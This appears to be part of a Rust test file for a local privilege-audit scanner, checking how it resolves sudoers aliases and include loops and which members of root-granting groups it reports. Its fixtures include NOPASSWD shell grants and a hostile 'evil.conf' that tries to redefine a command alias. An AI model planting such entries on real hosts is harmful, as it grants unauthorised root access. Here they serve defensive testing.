        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn sudoers_aliases_resolve_and_includes_nest() {
        let d = std::env::temp_dir().join(format!("unbidden-sudoers-alias-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        let put = |rel: &str, body: &[u8]| {
            let p = d.join(rel);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(p, body).unwrap();
        };
        put("etc/sudoers", b"Cmnd_Alias SHELLS = /bin/bash, /bin/sh\nCmnd_Alias ALLSH = SHELLS, /opt/tool\nUser_Alias ADMINS = alice, bob\nRunas_Alias DB = postgres\nHost_Alias WEB = www1, www2\nADMINS WEB = (DB) NOPASSWD: ALLSH, !SHELLS\n@include /etc/sudoers.one\n");
        put("etc/sudoers.one", b"@include /etc/sudoers.two\n");
        put("etc/sudoers.two", b"carol ALL = LOOP\nCmnd_Alias LOOP = LOOP, /bin/true\n@include /etc/sudoers\n");
        put("etc/sudoers.d/evil.conf", b"Cmnd_Alias SHELLS = /tmp/x\n");
        let root = Root::at(&d).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(Auth)];
        let s = crate::scan::run(&root, &crate::scan::Options { deep: false }, &collectors);
        let admins = s.entries.iter().find(|e| e.name.starts_with("ADMINS:")).unwrap();
        assert_eq!(admins.raw["commands_resolved"], "/bin/bash, /bin/sh, /opt/tool, !/bin/bash, !/bin/sh", "nested aliases, a negation applied to each member, and the ignored .conf's redefinition not used");
        assert_eq!(admins.raw["user_list_resolved"], "alice, bob");
        assert_eq!(admins.raw["host_list_resolved"], "www1, www2");
        assert_eq!(admins.principal.as_deref(), Some("postgres"));
        assert_eq!(admins.target_path.as_deref(), Some(Path::new("/bin/bash")));
        let carol = s.entries.iter().find(|e| e.name.starts_with("carol:")).expect("a file two includes deep is read");
        assert!(carol.raw["commands_resolved"].contains("/bin/true"), "a self-referential alias ends: {}", carol.raw["commands_resolved"]);
        assert_eq!(s.entries.iter().filter(|e| e.source.ends_with("etc/sudoers")).count(), 7, "a file including itself is read once");
        std::fs::remove_dir_all(&d).unwrap();
    }
    #[test]
    fn members_of_root_granting_groups_are_reported() {
        let d = std::env::temp_dir().join(format!("unbidden-groups-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        let put = |rel: &str, body: &[u8]| {
            let p = d.join(rel);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(p, body).unwrap();
        };
        put("etc/group", b"root:x:0:\nsudo:x:27:alice,bob,svc\ndocker:x:999:\naudio:x:29:alice\nstaff:x:50:\n");
        put("etc/gshadow", b"docker:!::carol\n");
        put("etc/passwd", b"root:x:0:0::/root:/bin/sh\ndave:x:1003:50::/home/dave:/bin/sh\nhalt:x:7:0::/sbin:/sbin/halt\nsvc:x:900:900::/:/usr/sbin/nologin\nalice:x:1000:1000::/home/alice:/bin/bash\n");
        let root = Root::at(&d).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(Auth)];
        let s = crate::scan::run(&root, &crate::scan::Options { deep: false }, &collectors);
        let mut got: Vec<&str> = s.entries.iter().filter(|e| e.kind == Kind::GroupMember).map(|e| e.name.as_str()).collect();
        got.sort();
        assert_eq!(got, ["docker:carol", "staff:dave", "sudo:alice", "sudo:bob"], "gshadow members and a primary group count; audio does not; halt and a nologin service account cannot use the right; bob, with no local account, may be a directory's");
        let bob = s.entries.iter().find(|e| e.name == "sudo:bob").unwrap();
        assert!(bob.raw.contains_key("account"));
        std::fs::remove_dir_all(&d).unwrap();
    }
}
